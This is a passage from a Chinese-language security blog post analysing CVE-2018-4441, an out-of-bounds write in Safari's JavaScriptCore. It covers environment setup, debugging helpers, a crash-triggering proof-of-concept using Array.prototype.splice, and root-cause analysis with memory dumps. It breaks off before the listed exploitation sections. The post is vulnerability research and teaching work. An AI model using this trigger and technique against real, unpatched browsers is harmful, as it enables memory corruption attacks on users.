<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="  作者最近研究了safari浏览器JavascriptCore引擎的一个OOB漏洞CVE-2018-4441，虽然这是一个比较老的漏洞，但是研究这个漏洞还是能学到不少东西。这里介绍了jsc环境搭建的方法和jsc一些基本调试技巧，详细分析了CVE-2018-4441的漏洞成因和lokihardt堆喷修改数组长度构成OOB的方法，希望读者读完能有所收获。"><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/highlight.css"><link rel="stylesheet" type="text/css" href="/css/noise.css"><title>CVE-2018-4441 | /home/5n1p3r0010</title><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Hexo 5.4.0"></head><body><article class="wrapper"><div class="post-main"><div class="nav"><nav class="container"><a class="sidebar-nav-item active" href="/">Home</a><a class="sidebar-nav-item" href="/archives">Archives</a></nav><div class="container post-meta"><div class="post-tags"><a class="post-tag-none-link" href="/tags/Browser/" rel="tag">Browser</a></div><div class="post-time">2020-06-03</div></div></div><div class="container post-header"><h1>CVE-2018-4441</h1></div><div class="container post-toc"><details class="toc"><summary class="toc-accordion">Table of Contents</summary><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">下载源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85"><span class="toc-number">1.2.</span> <span class="toc-text">编译安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">调试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#js%E6%96%AD%E7%82%B9"><span class="toc-number">1.3.1.</span> <span class="toc-text">js断点</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E8%B1%A1%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">对象调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-number">2.1.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A0%B9%E6%BA%90%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞根源分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#patch%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">patch分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#heap-spray"><span class="toc-number">3.1.</span> <span class="toc-text">heap spray</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#arbitrary-code-execute"><span class="toc-number">3.2.</span> <span class="toc-text">arbitrary code execute</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#fake-structureID"><span class="toc-number">3.2.1.</span> <span class="toc-text">fake structureID</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#arbitrary-read-write"><span class="toc-number">3.2.2.</span> <span class="toc-text">arbitrary read&#x2F;write</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="toc-number">4.</span> <span class="toc-text">完整exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol></details></div><div class="container post-content"><p>  作者最近研究了safari浏览器JavascriptCore引擎的一个OOB漏洞CVE-2018-4441，虽然这是一个比较老的漏洞，但是研究这个漏洞还是能学到不少东西。这里介绍了jsc环境搭建的方法和jsc一些基本调试技巧，详细分析了CVE-2018-4441的漏洞成因和lokihardt堆喷修改数组长度构成OOB的方法，希望读者读完能有所收获。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h4><p>​    下载源码使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;git.webkit.org&#x2F;git&#x2F;WebKit.git WebKit</span><br></pre></td></tr></table></figure>

<p>​    如下载的源码较旧需更新源码到最新日期则使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch --all</span><br><span class="line">git reset --hard origin&#x2F;master</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>​    切换到包含漏洞的commit_hash，这里我没有找到很好的方法，我使用的方法是搜索CVE-2018-4441的修复日期fix_date，然后从webkit的github上搜索小于fix_date的commit，即committer-date:&lt;fix_date，最后使用的是21687be235d506b9712e83c1e6d8e0231cc9adfd。切换的命令如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b CVE-2018-4441 21687be235d506b9712e83c1e6d8e0231cc9adfd</span><br></pre></td></tr></table></figure>

<p>命令的格式为git checkout -b {local_name} {commit_hash}。</p>
<h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h4><p>​    安装依赖项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tools&#x2F;gtk&#x2F;install-dependencies</span><br></pre></td></tr></table></figure>

<p>这里如果是在linux下使用时提示缺少pipenv包需要注释掉install-dependencies中函数installDependenciesWithApt里边的pipenv包。</p>
<p>​    编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Tools&#x2F;Scripts&#x2F;build-webkit --jsc-only --debug</span><br><span class="line">Tools&#x2F;Scripts&#x2F;build-webkit --jsc-only --release</span><br></pre></td></tr></table></figure>

<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><h5 id="js断点"><a href="#js断点" class="headerlink" title="js断点"></a>js断点</h5><p>​    这里介绍两个使jsc在我们编写的js代码里断下来的技巧（即类似V8的%SystemBreak()）。</p>
<h6 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h6><p>​    在编写的js代码里定义断点函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function b()&#123;</span><br><span class="line">	Array.prototype.slice([]);	&#x2F;&#x2F;needs &quot;b arrayProtoFuncSlice&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在调试器里设置arrayProtoFuncSlice的断点即”b arrayProtoFuncSlice”。这样在js代码里调用b()调试器就会断在这里了。</p>
<p>​    这个方法的缺点是如果调试的漏洞会调用到arrayProtoFuncSlice的话可能会对漏洞分析调试产生影响。</p>
<h6 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h6><p>​    修改jsc的源码添加如下辅助函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">diff --git diff --git a&#x2F;Source&#x2F;JavaScriptCore&#x2F;jsc.cpp b&#x2F;Source&#x2F;JavaScriptCore&#x2F;jsc.cpp</span><br><span class="line">index bda9a09d0d2..d359518b9b6 100644</span><br><span class="line">--- a&#x2F;Source&#x2F;JavaScriptCore&#x2F;jsc.cpp</span><br><span class="line">+++ b&#x2F;Source&#x2F;JavaScriptCore&#x2F;jsc.cpp</span><br><span class="line">@@ -994,6 +994,7 @@ static EncodedJSValue JSC_HOST_CALL functionSetHiddenValue(ExecState*);</span><br><span class="line"> static EncodedJSValue JSC_HOST_CALL functionPrintStdOut(ExecState*);</span><br><span class="line"> static EncodedJSValue JSC_HOST_CALL functionPrintStdErr(ExecState*);</span><br><span class="line"> static EncodedJSValue JSC_HOST_CALL functionDebug(ExecState*);</span><br><span class="line">+static EncodedJSValue JSC_HOST_CALL functionDbg(ExecState*);</span><br><span class="line"> static EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState*);</span><br><span class="line"> static EncodedJSValue JSC_HOST_CALL functionDescribeArray(ExecState*);</span><br><span class="line"> static EncodedJSValue JSC_HOST_CALL functionSleepSeconds(ExecState*);</span><br><span class="line">@@ -1218,6 +1219,7 @@ protected:</span><br><span class="line"></span><br><span class="line">         addFunction(vm, &quot;debug&quot;, functionDebug, 1);</span><br><span class="line">         addFunction(vm, &quot;describe&quot;, functionDescribe, 1);</span><br><span class="line">+        addFunction(vm, &quot;dbg&quot;, functionDbg, 0);</span><br><span class="line">         addFunction(vm, &quot;describeArray&quot;, functionDescribeArray, 1);</span><br><span class="line">         addFunction(vm, &quot;print&quot;, functionPrintStdOut, 1);</span><br><span class="line">         addFunction(vm, &quot;printErr&quot;, functionPrintStdErr, 1);</span><br><span class="line">@@ -1752,6 +1754,13 @@ EncodedJSValue JSC_HOST_CALL functionDebug(ExecState* exec)</span><br><span class="line">     return JSValue::encode(jsUndefined());</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">+EncodedJSValue JSC_HOST_CALL functionDbg(ExecState* exec)</span><br><span class="line">+&#123;</span><br><span class="line">+       asm(&quot;int3;&quot;);</span><br><span class="line">+</span><br><span class="line">+       return JSValue::encode(jsUndefined());</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState* exec)</span><br><span class="line"> &#123;</span><br><span class="line">     if (exec-&gt;argumentCount() &lt; 1)</span><br></pre></td></tr></table></figure>

<p>重新编译jsc代码，在js代码里定义如下断点函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function b()&#123;</span><br><span class="line">	dbg();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    这样在js代码里调用函数b()时调试器就会断在这里了。</p>
<h5 id="对象调试"><a href="#对象调试" class="headerlink" title="对象调试"></a>对象调试</h5><p>​    jsc中也有一些类似v8的%DebugPrint()的辅助调试输出函数，定义在JavaScriptCore/jsc.cpp里。jsc中输出对象的方法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debug(describe(obj));</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line">    let arr &#x3D; [1];</span><br><span class="line"></span><br><span class="line">    arr.length &#x3D; 0x100000;</span><br><span class="line">    arr.splice(0, 0x11);</span><br><span class="line"></span><br><span class="line">    arr.length &#x3D; 0xfffffff0;</span><br><span class="line">    arr.splice(0xfffffff0, 0, 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure>

<p>​    poc中首先定义了一个CopyOnWriteArrayWithInt32的数组arr，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt; Object: 0x7fffb30b4340 with butterfly 0x7fe0000e4010 (Structure 0x7fffb30f2c30:[Array, &#123;&#125;, CopyOnWriteArrayWithInt32, Proto:0x7fffb30c80a0, Leaf]), StructureID: 102</span><br></pre></td></tr></table></figure>

<p>其中jsc的数组存储规则定义在/Source/JavaScriptCore/runtime/ArrayConventions.h里。elements的存储定义如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;   * Where (i &lt; MIN_SPARSE_ARRAY_INDEX) the value will be stored in the storage vector,</span><br><span class="line">&#x2F;&#x2F;     unless the array is in SparseMode in which case all properties go into the map.</span><br><span class="line">&#x2F;&#x2F;   * Where (MIN_SPARSE_ARRAY_INDEX &lt;&#x3D; i &lt;&#x3D; MAX_STORAGE_VECTOR_INDEX) the value will either</span><br><span class="line">&#x2F;&#x2F;     be stored in the storage vector or in the sparse array, depending on the density of</span><br><span class="line">&#x2F;&#x2F;     data that would be stored in the vector (a vector being used where at least</span><br><span class="line">&#x2F;&#x2F;     (1 &#x2F; minDensityMultiplier) of the entries would be populated).</span><br><span class="line">&#x2F;&#x2F;   * Where (MAX_STORAGE_VECTOR_INDEX &lt; i &lt;&#x3D; MAX_ARRAY_INDEX) the value will always be stored</span><br><span class="line">&#x2F;&#x2F;     in the sparse array.</span><br></pre></td></tr></table></figure>

<p>此时arr的元素下标小于MIN_SPARSE_ARRAY_INDEX（即100000U）会存储在butterfly的storage vector里，butterfly（0x7fe0000e4010）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7fe0000e4000:	0x0100111500000014	0x0000000100000001</span><br><span class="line">0x7fe0000e4010:	0xffff000000000001	0x00000000badbeef0</span><br><span class="line">0x7fe0000e4020:	0x00000000badbeef0	0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>​    poc中之后修改了arr的长度为0x100000，此时下标大于MIN_SPARSE_ARRAY_INDEX（100000U）数组类型变为ArrayWithArrayStorage</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&gt; Object: 0x7fffb30b4340 with butterfly 0x7fe0000fe6e8 (Structure 0x7fffb30f2b50:[Array, &#123;&#125;, ArrayWithArrayStorage, Proto:0x7fffb30c80a0, Leaf]), StructureID: 100</span><br></pre></td></tr></table></figure>

<p>此时jsc开辟了新的ArrayStorage并把butterfly指向新的ArrayStorage。butterfly(0x7fe0000fe6e8)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7fe0000fe6d8:	0x00000000badbeef0	0x0000000100100000</span><br><span class="line">0x7fe0000fe6e8:	0x0000000000000000	0x0000000100000000</span><br><span class="line">0x7fe0000fe6f8:	0xffff000000000001	0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>​    在执行arr.splice(0, 0x11)，移除0x11个元素后butterfly变为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7fe0000fe6d8:	0x00000000badbeef0	0x00000001000fffef</span><br><span class="line">0x7fe0000fe6e8:	0x0000000000000000	0xfffffff000000000</span><br><span class="line">0x7fe0000fe6f8:	0x0000000000000000	0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>​    poc中重新设置arr的长度arr.length = 0xfffffff0，此时butterfly变为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7fe0000fe6d8:	0x00000000badbeef0	0x00000001fffffff0</span><br><span class="line">0x7fe0000fe6e8:	0x0000000000000000	0xfffffff000000000</span><br><span class="line">0x7fe0000fe6f8:	0x0000000000000000	0x00000000badbeef0</span><br></pre></td></tr></table></figure>

<p>​    继续调用arr.splice(0xfffffff0, 0, 1)添加元素时发现jsc运行崩溃</p>
<p><img src="poc_crash.png" alt="poc_crash"></p>
<p>崩溃时写的地址为0x7ff0000fe6e8+0xfffffff0*8+0x10=0x7FF8000FE678，0x7FF8000FE678不可写导致崩溃</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap 0x7FF8000FE678</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x7ff400000000     0x7ffc00000000 ---p 800000000 0 </span><br></pre></td></tr></table></figure>

<h4 id="漏洞根源分析"><a href="#漏洞根源分析" class="headerlink" title="漏洞根源分析"></a>漏洞根源分析</h4><p>​    poc崩溃时栈回溯如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#0  JSC::JSArray::unshiftCountWithArrayStorage (this&#x3D;0x7fffb30b4340, exec&#x3D;0x1, startIndex&#x3D;&lt;optimized out&gt;, count&#x3D;1, storage&#x3D;0x7ff0000fe6e8) at ..&#x2F;..&#x2F;Source&#x2F;JavaScriptCore&#x2F;runtime&#x2F;JSArray.cpp:1060</span><br><span class="line">#1  0x00000000013a3369 in JSC::JSArray::unshiftCountWithAnyIndexingType (this&#x3D;0x7fffb30b4340, exec&#x3D;0x7fffffffcde0, startIndex&#x3D;4294967280, count&#x3D;&lt;optimized out&gt;) at ..&#x2F;..&#x2F;Source&#x2F;JavaScriptCore&#x2F;runtime&#x2F;JSObject.h:863</span><br><span class="line">#2  0x00000000012c19af in JSC::JSArray::unshiftCountForSplice (this&#x3D;&lt;optimized out&gt;, exec&#x3D;&lt;optimized out&gt;, startIndex&#x3D;&lt;optimized out&gt;, count&#x3D;&lt;optimized out&gt;) at ..&#x2F;..&#x2F;Source&#x2F;JavaScriptCore&#x2F;runtime&#x2F;JSArray.h:149</span><br><span class="line">#3  JSC::JSArray::unshiftCount&lt;(JSC::JSArray::ShiftCountMode)1&gt; (this&#x3D;&lt;optimized out&gt;, count&#x3D;&lt;optimized out&gt;, exec&#x3D;&lt;optimized out&gt;, startIndex&#x3D;&lt;optimized out&gt;) at ..&#x2F;..&#x2F;Source&#x2F;JavaScriptCore&#x2F;runtime&#x2F;JSArray.h:158</span><br><span class="line">#4  JSC::unshift&lt;(JSC::JSArray::ShiftCountMode)1&gt; (exec&#x3D;0x7fffffffcde0, thisObj&#x3D;0x7fffb30b4340, header&#x3D;&lt;optimized out&gt;, currentCount&#x3D;0, resultCount&#x3D;&lt;optimized out&gt;, length&#x3D;4294967280) at ..&#x2F;..&#x2F;Source&#x2F;JavaScriptCore&#x2F;runtime&#x2F;ArrayPrototype.cpp:361</span><br><span class="line">#5  0x00000000012b6b2a in JSC::arrayProtoFuncSplice (exec&#x3D;0x7fffffffcde0) at ..&#x2F;..&#x2F;Source&#x2F;JavaScriptCore&#x2F;runtime&#x2F;ArrayPrototype.cpp:1091</span><br><span class="line">#6  0x00007fffb39ff177 in ?? ()</span><br><span class="line">#7  0x00007fffffffce70 in ?? ()</span><br><span class="line">#8  0x0000000001126f00 in llint_entry ()</span><br></pre></td></tr></table></figure>

<p>我分析这个漏洞根本原因的方法是先从ECMAScript查了下Array.prototype.splice方法的实现，然后从崩溃的开始JSC::arrayProtoFuncSplice函数分析。</p>
<p>​    JSC::arrayProtoFuncSplice的大致逻辑是找到splice调用时的数组起点actualstart并根据参数个数来对数组进行删除元素或添加元素，删除或添加元素使用的是shift或unshift。</p>
<p>​    poc中第一次调用arr.splice(0, 0x11)删除元素时使用的是shift，并最终由于arr类型为ArrayWithArrayStorage调用到shiftCountWithArrayStorage。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bool JSArray::shiftCountWithArrayStorage(VM&amp; vm, unsigned startIndex, unsigned count, ArrayStorage* storage)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">    &#x2F;&#x2F; If the array contains holes or is otherwise in an abnormal state,</span><br><span class="line">    &#x2F;&#x2F; use the generic algorithm in ArrayPrototype.</span><br><span class="line">    if ((storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)) </span><br><span class="line">        || hasSparseMap() </span><br><span class="line">        || shouldUseSlowPut(indexingType())) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if (!oldLength)</span><br><span class="line">        return true;</span><br><span class="line">    </span><br><span class="line">    unsigned length &#x3D; oldLength - count;   </span><br><span class="line">    storage-&gt;m_numValuesInVector -&#x3D; count;</span><br><span class="line">    storage-&gt;setLength(length);</span><br></pre></td></tr></table></figure>

<p>在shiftCountWithArrayStorage进行了一些列判断来决定array是否使用ArrayPrototype中的方法处理splice调用中的删除元素操作，若这一系列判断条件全部为假则执行storage-&gt;m_numValuesInVector -= count对splice调用中的数组storage-&gt;vectorLength赋值的操作，实际上这一系列的判断是存在缺陷的，漏洞的根源也就出在这里。产生漏洞的原因即判断条件全部为假时m_numValuesInVector 和array.length我们可控，在随后的分析中我们可以看到这两个值可控会导致添加元素调用unshiftCountWithArrayStorage时实际storage-&gt;hasHoles()为真的数组返回为假，在memmove初始化新的storage时导致OOB。</p>
<p>​    shiftCountWithArrayStorage中首先判断了hasHoles，jsc中storage-&gt;hasHoles()实际上判断的是*(dword*)(&amp;butterfly+0xc)==*(dword*)(&amp;butterfly-0x4)，即storageLength==vectorLength，</p>
<p><img src="hasHoles.png" alt="hasHoles">此时由于m_numValuesInVector!=storage-&gt;length，hasHoles为真。butterfly(0x7ff0000fe6e8) </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;6xg 0x7ff0000fe6e8-0x10</span><br><span class="line">0x7ff0000fe6d8:	0x00000000badbeef0	0x0000000100100000</span><br><span class="line">0x7ff0000fe6e8:	0x0000000000000000	0x0000000100000000</span><br><span class="line">0x7ff0000fe6f8:	0xffff000000000001	0x00000000badbeef0</span><br><span class="line">pwndbg&gt;  p *(JSC::ArrayStorage *) 0x7ff0000fe6e8</span><br><span class="line">$8 &#x3D; &#123;</span><br><span class="line">  m_sparseMap &#x3D; &#123;</span><br><span class="line">    &lt;JSC::WriteBarrierBase&lt;JSC::SparseArrayValueMap, WTF::DumbPtrTraits&lt;JSC::SparseArrayValueMap&gt; &gt;&gt; &#x3D; &#123;</span><br><span class="line">      m_cell &#x3D; 0x0</span><br><span class="line">    &#125;, &lt;No data fields&gt;&#125;, </span><br><span class="line">  m_indexBias &#x3D; 0, </span><br><span class="line">  m_numValuesInVector &#x3D; 1, </span><br><span class="line">  m_vector &#x3D; &#123;&#123;</span><br><span class="line">      &lt;JSC::WriteBarrierBase&lt;JSC::Unknown, WTF::DumbValueTraits&lt;JSC::Unknown&gt; &gt;&gt; &#x3D; &#123;</span><br><span class="line">        m_value &#x3D; -281474976710655</span><br><span class="line">      &#125;, &lt;No data fields&gt;&#125;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后继续判断会调用到holesMustForwardToPrototype</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">bool Structure::holesMustForwardToPrototype(VM&amp; vm, JSObject* base) const</span><br><span class="line">&#123;</span><br><span class="line">    ASSERT(base-&gt;structure(vm) &#x3D;&#x3D; this);</span><br><span class="line"></span><br><span class="line">    if (this-&gt;mayInterceptIndexedAccesses())</span><br><span class="line">        return true;</span><br><span class="line"></span><br><span class="line">    JSValue prototype &#x3D; this-&gt;storedPrototype(base);</span><br><span class="line">    if (!prototype.isObject())</span><br><span class="line">        return false;</span><br><span class="line">    JSObject* object &#x3D; asObject(prototype);</span><br><span class="line"></span><br><span class="line">    while (true) &#123;</span><br><span class="line">        Structure&amp; structure &#x3D; *object-&gt;structure(vm);</span><br><span class="line">        if (hasIndexedProperties(object-&gt;indexingType()) || structure.mayInterceptIndexedAccesses())</span><br><span class="line">            return true;</span><br><span class="line">        prototype &#x3D; structure.storedPrototype(object);</span><br><span class="line">        if (!prototype.isObject())</span><br><span class="line">            return false;</span><br><span class="line">        object &#x3D; asObject(prototype);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RELEASE_ASSERT_NOT_REACHED();</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>holesMustForwardToPrototype中主要是遍历了array的原型链并判断了hasIndexedProperties和mayInterceptIndexedAccesses属性，如果这两个属性都为假会返回false。</p>
<p>​    回到shiftCountWithArrayStorage的3个判断，即</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ((storage-&gt;hasHoles() &amp;&amp; this-&gt;structure(vm)-&gt;holesMustForwardToPrototype(vm, this)) </span><br><span class="line">        || hasSparseMap() </span><br><span class="line">        || shouldUseSlowPut(indexingType()))</span><br></pre></td></tr></table></figure>

<p>按照lokihardt的说法由于poc中的arr在原型链中不含索引访问和proxy对象，第一个&amp;&amp;的判断中holesMustForwardToPrototype会为假。其余两个判断也为假。这样就导致shiftCountWithArrayStorage执行到如下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">storage-&gt;m_numValuesInVector -&#x3D; count;</span><br></pre></td></tr></table></figure>

<p>poc中的arr-&gt;m_numValuesInVector = 1，这样删除0x11个元素后1-0x11=0xFFFFFFFFFFFFFFF0，保存时取低4字节为0xfffffff0。</p>
<p>​    poc中执行到arr.splice(0xfffffff0, 0, 1)添加元素时使用的是unshift，并最终由于arr类型为ArrayWithArrayStorage调用到unshiftCountWithArrayStorage。</p>
